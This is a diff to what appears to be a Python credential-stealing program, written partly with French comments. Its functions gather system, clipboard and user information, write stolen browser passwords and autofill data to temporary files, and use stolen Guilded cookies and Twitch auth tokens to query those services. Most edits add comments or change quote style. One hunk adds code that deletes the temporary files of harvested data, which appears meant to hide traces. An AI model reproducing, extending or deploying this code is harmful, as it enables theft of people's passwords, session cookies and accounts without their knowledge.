@@ -272,6 +272,7 @@ def fakegen():
                 continue
             essay = int(essay)
 
+            # Create a thread to run the generate_codes function
             thread = threading.Thread(target=generate_codes, args=(essay,))
             thread.start()
 
@@ -1611,6 +1612,7 @@ def getinfo():
             clipboardtext_future = executor.submit(clip)
             useri = executor.submit(userinfo)
 
+            # Attendre que toutes les tâches soient terminées
             sysinfo = sysinfo_future.result()
             globalinfo = globalinfo_future.result()
             clipboardtext = clipboardtext_future.result()
@@ -2107,7 +2109,10 @@ def paaz(filetype):
             file2 = os.getenv("TEMP") + f"\wppassw.txt"
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             file4 = os.getenv("TEMP") + '\winvs.txt'
-
+            file5 = os.getenv("TEMP") + '\winvs.txt'
+            ss = [file,file5,file2,file3,file4]
+            for file in ss:
+                os.remove(file)
 
         except Exception as e:
             pass
@@ -2319,6 +2324,7 @@ def guilded(cookie):
             social_links = response["user"]['socialLinks']
             social_links_info = []
 
+            # Iterate through social links and store information in a list
             for link in social_links:
                 name = link.get('handle', '')
                 websitename = link.get('type', 'Cannot get the website')
@@ -2532,7 +2538,7 @@ def twitch_session(auth_token, username):
             'Content-Type': 'application/json',
         }
 
-        query = f'''
+        query = f"""
         
         query {{
             user(login: "{username}") {{
@@ -2550,7 +2556,7 @@ def twitch_session(auth_token, username):
                 }}
             }}
         }}
-        '''
+        """
 
         data = {
             "query": query
